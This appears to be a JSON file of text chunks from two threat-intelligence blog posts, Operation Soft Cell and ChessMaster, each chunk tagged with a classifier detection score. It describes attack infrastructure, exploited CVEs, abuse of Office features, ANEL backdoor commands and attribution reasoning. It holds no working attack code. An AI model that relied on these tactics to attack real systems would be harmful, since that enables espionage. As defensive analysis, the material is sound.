        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.4057803153991699
        },
        "prediction": {}
    },
    {
        "text": "In order to make sense of all the data, we fed it into multiple threat intelligence sources, including our own and third parties.\n \u26a0\ufe0f Note: Since we cannot share any IOCs, we will refer to file hashes, hostnames, IP addresses and other IOCs as generic placeholders.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5032998323440552
        },
        "prediction": {}
    },
    {
        "text": "Hostname1 is the hostname that was used for the C2 server targeting the telecommunications providers.\n\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7662301063537598
        },
        "prediction": {}
    },
    {
        "text": "In analyzing the files, it is clear they are all contacting the same host hostname1.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6985504031181335
        },
        "prediction": {}
    },
    {
        "text": "Once we determined the hashes in the scope of the attack were only connecting to hostname1, which is a dynamic DNS hostname, we looked to see if we could find more information about the C2 server.\n A simple WHOIS query revealed that the IP address was registered to a colocation hosting company in Asia, though there was no other publicly available information about this IP address.\n By querying all of our threat intel resources about this IP address, we discovered that it was associated with multiple dynamic DNS hostnames.\n\u00a0\n\n\u00a0\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.4828680753707886
        },
        "prediction": {}
    },
    {
        "text": "For the other dynamic DNS hosts, we leveraged various threat intel repositories and crafted queries that searched for executables with these IP addresses and hostnames in their string table. One of the queries returned a few DLLs with identical names to the DLL we had initially investigated.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6220019459724426
        },
        "prediction": {}
    },
    {
        "text": "After obtaining the found DLLs, we patched them back into the NSIS installer and detonated the samples in our testing environment. Dynamic analysis of the newly obtained DLLs revealed a new set of domains and IP addresses that were completely different. These domains were actually related to different telecommunications providers. \n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6548828482627869
        },
        "prediction": {}
    },
    {
        "text": "\u26a0\ufe0f Note: Cybereason immediately reached out to those telecommunications providers and provided them all of the necessary information to handle the incident internally.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6738532185554504
        },
        "prediction": {}
    },
    {
        "text": "We can see many details about the attack including domains and C2 server IP addresses.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7223572731018066
        },
        "prediction": {}
    },
    {
        "text": "The threat actor had a specific pattern of behavior that allowed us to understand their modus operandi: they used one server with the same IP address for multiple operations.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6924282312393188
        },
        "prediction": {}
    },
    {
        "text": "The threat actor separated operations by using different hostnames per operation, though they are hosted on the same server and IP address. The domains and server registration information pointed to three main countries: China, Hong Kong, and Taiwan.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6006006598472595
        },
        "prediction": {}
    },
    {
        "text": "This is cheap and efficient for the threat actor, but is almost transparent for a seasoned researcher with access to the right threat intelligence tools. There are previous reports of threat actors including APT10 and APT1 using dynamic DNS.\n Monitoring this infrastructure gave us information about if and when the threat actor was starting new waves of the attack or additional attacks on other providers.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5686699151992798
        },
        "prediction": {}
    },
    {
        "text": "When researching C2 servers, it is important to watch for:\nAssociation with domains, especially if they are dynamic DNS domains.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.4733521640300751
        },
        "prediction": {}
    },
    {
        "text": "File hashes that are associated with the IP address or the domain of the C2 server.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7344428896903992
        },
        "prediction": {}
    },
    {
        "text": "Static information and metadata from associated samples that could be used to broaden the search after additional information is gathered.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6810984015464783
        },
        "prediction": {}
    },
    {
        "text": "This demonstrates the importance of proper operational security and a separation between tools and operations for threat actors.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.690803587436676
        },
        "prediction": {}
    },
    {
        "text": "In most cases, it is very difficult to achieve 100% certainty when attributing an attack to a specific threat actor.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6259555220603943
        },
        "prediction": {}
    },
    {
        "text": "It can be tempting to attribute an attack to a certain threat actor whenever certain tools-of-the-trade, IP addresses, strings, or \u201cindicative\u201d techniques are observed.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6151797771453857
        },
        "prediction": {}
    },
    {
        "text": "However, it is important to bear in mind that the aforementioned data points are often prone to manipulation and reuse across different threat actors. Further, they are not impervious to psychological warfare, as in, trying to \u201cpin\u201d an operation on a different threat actor to avoid proper attribution.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6013987064361572
        },
        "prediction": {}
    },
    {
        "text": "In order to increase the certainty level when attributing to a specific threat actor, we took the following aspects of the attacks into consideration:\u00a0\n\nIndicators of Compromise\nTTPs (Tactics, Techniques and Procedures)\nThreat actor's tools\nMotive behind the attacks\nRegional and industry considerations\n\nCarefully examining each of the different aspects plays an important role in avoiding misattribution.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6025909781455994
        },
        "prediction": {}
    },
    {
        "text": "This model offers a more balanced interpretation of the data that is based on a myriad of components. By performing a contextualized review of the data, you are able to yield a more wholesome result with greater certainty.\n When it comes to attributing Operation Soft Cell, we are unable to achieve 100% certainty with regard to the identity of the threat actor. However, based on our interpretation of the data, we conclude with a high level of certainty that:\nThe threat actor behind Operation Soft Cell is likely state-sponsored.\n The threat actor is affiliated with China.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.4230387210845947
        },
        "prediction": {}
    },
    {
        "text": "After following the above attribution model and carefully reviewing the data, we are able to narrow down the suspect list to three known APT groups, all of which are known to be linked to China- APT10, APT27, and DragonOK.\n Having found multiple similarities to previous attacks, it is our estimation that the threat actor behind these attacks is likely linked to APT10, or at the very least, to a threat actor that shares tools, techniques, motive and infrastructural preferences with those of APT10.\n While we cannot completely rule out a \u201ccopy-cat\u201d scenario, where another threat actor might masquerade as APT10 to thwart attribution efforts, we find this option to be less likely in light of our analysis of the data.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.39536112546920776
        },
        "prediction": {}
    },
    {
        "text": "Conclusion\nIn this blog, we have described an ongoing global attack against telecommunications providers that has been active since at least 2017.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5647333264350891
        },
        "prediction": {}
    },
    {
        "text": "The threat actor managed to infiltrate into the deepest segments of the providers\u2019 network, including some isolated from the internet, as well as compromise critical assets.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7075186967849731
        },
        "prediction": {}
    },
    {
        "text": "Our investigation showed that these attacks were targeted, and that the threat actor sought to steal communications data of specific individuals in various countries.\n ",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6308411955833435
        },
        "prediction": {}
    },
    {
        "text": "Throughout this investigation, we have uncovered the infrastructure that facilitated the malicious operations taken by this threat actor.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7303565144538879
        },
        "prediction": {}
    },
    {
        "text": "The data exfiltrated by this threat actor, in conjunction with the TTPs and tools used, allowed us to determine with a very high probability that the threat actor behind these malicious operations is backed by a nation state, and is affiliated with China.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6420739889144897
        },
        "prediction": {}
    },
    {
        "text": "Our contextualized interpretation of the data suggests that the threat actor is likely APT10, or at the very least, a threat actor that shares, or wishes to emulate its methods by using the same tools, techniques, and motives.\n ",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.633094072341919
        },
        "prediction": {}
    },
    {
        "text": "It\u2019s important to keep in mind that even though the attacks targeted specific individuals, any entity that possesses the power to take over the networks of telecommunications providers can potentially leverage its unlawful access and control of the network to shut down or disrupt an entire cellular network as part of a larger cyber warfare operation.\n ",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6757714748382568
        },
        "prediction": {}
    },
    {
        "text": "Due to multiple and various limitations, we cannot disclose all the information we have gathered on the attack in this report.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7030224800109863
        },
        "prediction": {}
    },
    {
        "text": "Our team will continue to monitor and track the threat actor\u2019s activity in order to identify more tools and compromised organizations.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6773439645767212
        },
        "prediction": {}
    },
    {
        "text": "Closing Notes: This research, which is still ongoing, has been a huge effort for the entire Cybereason Nocturnus team. Special thanks goes to Niv Yona, Noa Pinkas, Josh Trombley, Jakes Jansen, and every single member of the Nocturnus team for the countless hours and effort that were put into this research.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5673355460166931
        },
        "prediction": {}
    },
    {
        "text": "We will continue to monitor and update our blog with more information once available and as our investigation progresses.\n\n\n\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5794745087623596
        },
        "prediction": {}
    },
    {
        "text": "Share\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAbout the Author\nCybereason Nocturnus\n\n\n\n\n\n\nThe Cybereason Nocturnus Team has brought the world\u2019s brightest minds from the military, government intelligence, and enterprise security to uncover emerging threats across the globe.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6534499526023865
        },
        "prediction": {}
    },
    {
        "text": "The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.\n All Posts by Cybereason Nocturnus\n\n\n\n\n\n\n\n\n\n\n\nRelated Posts\n\n\n\n\nTHREAT ANALYSIS REPORT: Bumblebee Loader \u2013 The High Road to Enterprise Domain Control\nCybereason GSOC observed distribution of the Bumblebee Loader and post-exploitation activities including privilege escalation, reconnaissance and credential theft. Bumblebee operators use the Cobalt Strike framework throughout the attack and abuse credentials for privilege escalation to access Active Directory, as well as abusing a domain administrator account to move laterally, create local user accounts and exfiltrate data...\n\n\n\n\n\nTHREAT ANALYSIS: From IcedID to Domain Compromise\nRecently, IcedID, also known as BokBot, has been used more as a dropper for other malware families and as a tool for initial access brokers.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.30611830949783325
        },
        "prediction": {}
    },
    {
        "text": "Subscribe\nNever miss a blog.\n\n\n\n Recent Posts\n\n\nTHREAT ALERT: DJvu Variant Delivered by Loader Masquerading as Freeware\n\n\n\n\n2024 Cybersecurity Predictions - Generative AI Reshapes Cybersecurity\n\n\n\n\nTHREAT ALERT: INC Ransomware\n\n\n\n\nCategories\n\nResearch\nPodcasts\nWebinars\nResources\nVideos\nNews\n\nAll Posts\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRelated Posts\n\n\n\n\nTHREAT ANALYSIS REPORT: Bumblebee Loader \u2013 The High Road to Enterprise Domain Control\nCybereason GSOC observed distribution of the Bumblebee Loader and post-exploitation activities including privilege escalation, reconnaissance and credential theft. Bumblebee operators use the Cobalt Strike framework throughout the attack and abuse credentials for privilege escalation to access Active Directory, as well as abusing a domain administrator account to move laterally, create local user accounts and exfiltrate data...\n\n\n\n\n\nTHREAT ANALYSIS: From IcedID to Domain Compromise\nRecently, IcedID, also known as BokBot, has been used more as a dropper for other malware families and as a tool for initial access brokers.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n NEWSLETTER\nNever miss a blog\nGet the latest research, expert insights, and security industry news.\n Subscribe\n\n\n\n\n\n\n\n\n\n\n\n\nWant to see the Cybereason Defense Platform in action?\nSchedule a Demo\n\nX\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAbout\n\n Who We Are\nCareers\n\nContact\n\n\n\nResources\n\nBlog\nCase Studies\nWebinars\nWhite Papers\n\n\n\nPlatform\n\nOverview\nEndpoint Protection\nEDR\nMDR\n\n\n\n\n\n\n\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.20317496359348297
        },
        "prediction": {}
    },
    {
        "text": "Terms of Use\nPrivacy Notice\nDo Not Sell\nSecurity\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBy clicking \u201cAccept All Cookies\u201d, you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts. Cookies Settings Reject All Accept All CookiesPrivacy Preference CenterWhen you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5246498584747314
        },
        "prediction": {}
    },
    {
        "text": "This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6724076867103577
        },
        "prediction": {}
    },
    {
        "text": "Because we respect your right to privacy, you can choose not to allow some types of cookies.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5173817873001099
        },
        "prediction": {}
    },
    {
        "text": "Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.\n             More informationAllow All Manage Consent PreferencesStrictly Necessary CookiesAlways ActiveThese cookies are necessary for the website to function and cannot be switched off in our systems.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5870735049247742
        },
        "prediction": {}
    },
    {
        "text": "They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, logging in or filling in forms.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5568468570709229
        },
        "prediction": {}
    },
    {
        "text": "You can set your browser to block or alert you about these cookies, but some parts of the site will not then work. These cookies do not store any personally identifiable information.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5944161415100098
        },
        "prediction": {}
    },
    {
        "text": "Targeting Cookies  Targeting Cookies These cookies may be set through our site by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant adverts on other sites.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5640597343444824
        },
        "prediction": {}
    },
    {
        "text": "They do not store directly personal information, but are based on uniquely identifying your browser and internet device.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5441780686378479
        },
        "prediction": {}
    },
    {
        "text": "Performance Cookies  Performance Cookies These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6587858200073242
        },
        "prediction": {}
    },
    {
        "text": "They help us to know which pages are the most and least popular and see how visitors move around the site.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7284154891967773
        },
        "prediction": {}
    },
    {
        "text": "If you do not allow these cookies we will not know when you have visited our site, and will not be able to monitor its performance.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.4701407849788666
        },
        "prediction": {}
    },
    {
        "text": "Functional Cookies  Functional Cookies These cookies enable the website to provide enhanced functionality and personalisation.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7283973693847656
        },
        "prediction": {}
    },
    {
        "text": "They may be set by us or by third party providers whose services we have added to our pages.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5347203612327576
        },
        "prediction": {}
    },
    {
        "text": "If you do not allow these cookies then some or all of these services may not function properly.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.4902583956718445
        },
        "prediction": {}
    },
    {
        "text": "Back ButtonPerformance Cookies  Search IconFilter IconClear checkbox label labelApply CancelConsent Leg. Interest checkbox label label checkbox label label checkbox label labelReject All Confirm My Choices \n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.45161572098731995
        },
        "prediction": {}
    },
    {
        "text": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nChessMaster Adds Updated Tools to Its Arsenal\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBusiness\n\n\n\nsearch\nclose\n\n\n\n\n\n\n\n\n\n\nSolutions\n\n\n\nBy Challenge\n\n\n\n\n\nBy Challenge\n\n\n\n\n\nBy Challenge\nLearn more\n\n\n\n\n\n\n\n\nUnderstand, Prioritize & Mitigate Risks\n\n\n\n\n\nUnderstand, Prioritize & Mitigate Risks\nImprove your risk posture with attack surface management\nLearn more\n\n\n\n\n\n\n\n\nProtect Cloud-Native Apps\n\n\n\n\n\nProtect Cloud-Native Apps\nSecurity that enables business outcomes\nLearn more\n\n\n\n\n\n\n\n\nProtect Your Hybrid World\n\n\n\n\n\nProtect Your Hybrid, Multi-Cloud World\nGain visibility and meet business needs with security\nLearn more\n\n\n\n\n\n\n\n\nSecuring Your Borderless Workforce\n\n\n\n\n\nSecuring Your Borderless Workforce\nConnect with confidence from anywhere, on any device\nLearn more\n\n\n\n\n\n\n\n\nEliminate Network Blind Spots\n\n\n\n\n\nEliminate Network Blind Spots\nSecure users and key operations throughout your environment\nLearn more\n\n\n\n\n\n\n\n\nSee More.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.38211196660995483
        },
        "prediction": {}
    },
    {
        "text": "In this blog post, we analyze ChessMaster's current status, including the updated tools in its arsenal \u2014 with a particular focus on the evolution of ANEL and how it is used in the campaign.\n",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6851436495780945
        },
        "prediction": {}
    },
    {
        "text": "By: Tamada Kiyotaka, MingYen Hsieh\n\t\t\n\t\t\tMarch 29, 2018\nRead time:\u00a07 min (1963 words)\n\t\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSave to Folio\n\n\n\n\n\n\n Subscribe\n\n\n\n\n\n\n\n\n\n\n\n\nTrend Micro discovered the ChessMaster campaign back in July 2017 as part of our monitoring efforts to protect our customers.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5053406953811646
        },
        "prediction": {}
    },
    {
        "text": "At the time, we found ChessMaster targeting different sectors from the academe to media and government agencies in Japan. The threat group used a variety of attack tools and techniques to spy on their target organizations.\n\n",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6554268598556519
        },
        "prediction": {}
    },
    {
        "text": "Back then, we noted that ChessMaster's sophisticated nature implied that the campaign could evolve, before finding changes in the tools and tactics used in the campaign a few months later. \u00a0 While the original campaign was comprehensive and used remote access Trojans (RATs) such as ChChes and RedLeaves, this new campaign used a new backdoor (Detected by Trend Micro as BKDR_ANEL.ZKEI) that leverages the CVE-2017-8759\u00a0vulnerability for its cyberespionage activities.\n In this blog post, we analyze ChessMaster's current status, including the updated tools in its arsenal \u2014 with a particular focus on the evolution of ANEL and how it is used in the campaign.\n\n\u00a0\n",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.4396756887435913
        },
        "prediction": {}
    },
    {
        "text": "July ChessMaster Campaign\nNovember ChessMaster Campaign\nCurrent ChessMaster Campaign \nPoint of Entry\n\nSpear-phishing emails containing decoy documents\nMalicious shortcut (LNK) files and PowerShell\nSelf-extracting archive (SFX)\n Runtime packers\n\n\n\nSpear-phishing emails containing decoy documents exploiting CVE-2017-8759\n\n\n\nSpear-phishing emails containing decoy documents exploiting \u00a0CVE-2017-11882, DDEAUTO, Microsoft Office Frameset and Link auto update\n\n\nNotable Tools\n\nHacking Tools\nSecond-stage payloads\n\n\n\nKoadic\nHacking Tools\nSecond-stage payloads\n\n\n\nKoadic\nHacking Tools\nSecond-stage payloads\n\n\nBackdoor\n\nChChes\n\n\n\nANEL\n\n\n\nANEL\n\n\n\n\nTechnical Analysis\n\nFigure 1.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.2833089828491211
        },
        "prediction": {}
    },
    {
        "text": "Infection Chain for the current ChessMaster campaign\nChessMaster\u2019s current iteration starts off with the familiar phishing attacks seen in the earlier campaigns that involved the use of an email with an attached malicious document using the doc, docx, rtf, csv and msg formats.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6828768253326416
        },
        "prediction": {}
    },
    {
        "text": "The email title and attached file name were written in Japanese and contain general business, political, and economy-themed phrases such as\n\n\u4e16\u754c\u7d4c\u6e08(World economy)\n\u7d4c\u6e08\u653f\u7b56(economic policy)\n \u4e88\u7b97\u6982\u7b97\u8981\u6c42(budget estimation request)\n\u65e5\u7c73\u5bfe\u8a71(Japan-US dialogue)\n\u5b89\u500d\u518d\u4efb(re-appointment of Prime Minister Abe)\n\u9023\u7d61\u7db2(contact network)\n\u8077\u54e1\u63a1\u7528\u6848(staff recruitment plan)\n\u4f1a\u8b70(meeting)\n\n",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.4321349859237671
        },
        "prediction": {}
    },
    {
        "text": "When we tracked ChessMaster back in November, we noted that it exploited the SOAP WSDL parser vulnerability CVE-2017-8759 (patched in September 2017) within the Microsoft .NET framework to download additional malware. While ChessMaster still uses the previous exploit, it also added more methods to its arsenal: one exploits another vulnerability, CVE-2017-11882 (patched in November 2017), which was also exploited to deliver illegal versions of the Loki infostealer.\n\nFigure 2.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5204595923423767
        },
        "prediction": {}
    },
    {
        "text": "Exploitation of CVE-2017-11882\nIt also abuses three legitimate MS Office functions:\n\nFunction\nPurpose\nAffected MS Office Formats we found in the wild\nAutomatic Dynamic Data Exchange (DDEAUTO)\n A legitimate Microsoft Office function used in an Office file to retrieve data from another Office file \u00a0\n\n.doc\n.rtf\n .msg\n\n\nLink Auto Update\nAn Office function used for automatic and user-free updates for embedded links upon opening.\n\n .csv\n\n\nMicrosoft Word's \"Frames/Frameset\"\nA feature that allows HTML or Text pages to be loaded in a frame within Microsoft Word.\n\n.docx\n\n\n\n\n\nFigure 3. Exploitation of DDEAUTO\n\nFigure 4. Abusing Microsoft Word's \"Frames/Frameset\"\n\nFigure 5.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.24521023035049438
        },
        "prediction": {}
    },
    {
        "text": "Exploitation of Link Auto Update\nChessMaster can utilize any of these methods to download the next malware in the chain, the open source post-exploitation tool known as \u201cKoadic,\u201d which the previous campaign also used. This tool is responsible for stealing information \u2014 specifically the environment information \u2014 within the target system.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.7194809913635254
        },
        "prediction": {}
    },
    {
        "text": "<cmd> 1> <Output> 2>&1\n\nThe commands and output of Koadic will change according to the ANEL version used in the attack. The table below lists examples of the commands and outputs for ANEL versions 5.1.1 rc and 5.1.2 rc1.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5674649477005005
        },
        "prediction": {}
    },
    {
        "text": "Note that if ANEL 5.1.2 rc1 was downloaded, the attacker would use HTTPS to avoid the downloaded data being captured as clear text.\n\n",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6806858777999878
        },
        "prediction": {}
    },
    {
        "text": "If Koadic finds that the system is conducive to the attacker\u2019s interests, it downloads a base64-encrypted version of the ANEL malware from the Command-and-Control (C&C) server and executes it.\u00a0 ",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6380612254142761
        },
        "prediction": {}
    },
    {
        "text": "Encrypted ANEL is decrypted using the \u201ccertutil -docode\u201d command. When ANEL executes, a decrypted DLL file with the filename \u201clena_http_dll.dll\u201d is expanded in memory.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6378624439239502
        },
        "prediction": {}
    },
    {
        "text": "Base64 encoded ANEL downloaded by Koadic\nANEL will send the infected environment\u2019s information to the C&C server.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.7147528529167175
        },
        "prediction": {}
    },
    {
        "text": "When sending the information, ANEL encrypts the data using blowfish, XOR, and Base64-based encryption methods.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6490241885185242
        },
        "prediction": {}
    },
    {
        "text": "The format ANEL uses to send data is similar to ChChes, but ANEL's encryption method is easier to use.\n\n",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6825397610664368
        },
        "prediction": {}
    },
    {
        "text": "We initially discovered the malware known as ANEL back in September 2017. At that time, ChessMaster was using ANEL as a backdoor into the target system then injects code into svchost.exe, which then decrypts and activates the embedded backdoor. This initial version of ANEL had a hardcoded version labeled \u201c5.0.0 beta1\u201d that contained incomplete code.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5541552901268005
        },
        "prediction": {}
    },
    {
        "text": "Instead of just one new variant, we discovered four different versions of ANEL:\n\n5.0.0 beta1\n5.1.1 rc\n5.1.2 rc1\n5.2.0 rev1\n\nThe different versions contain changes in the ANEL loader and the main ANEL DLL.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5337537527084351
        },
        "prediction": {}
    },
    {
        "text": "Summary of the changes between each version of ANEL\nDifferences with regards to Backdoor commands:\n\nCMD ID\n5.0.0 beta1/5.1.1 rc/5.1.2 rc1\n5.2.0 rev1\n0x97A168D9697D40DD\nSave File\n0x7CF812296CCC68D5\nUpload File\n0x652CB1CEFF1C0A00\nNA\nLoad New PE file\n0x27595F1F74B55278\nSave File and Execute\nIf no match above\nExecute Command or File\n\n\nThe differences shown in the table above are subtle but present.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.39655551314353943
        },
        "prediction": {}
    },
    {
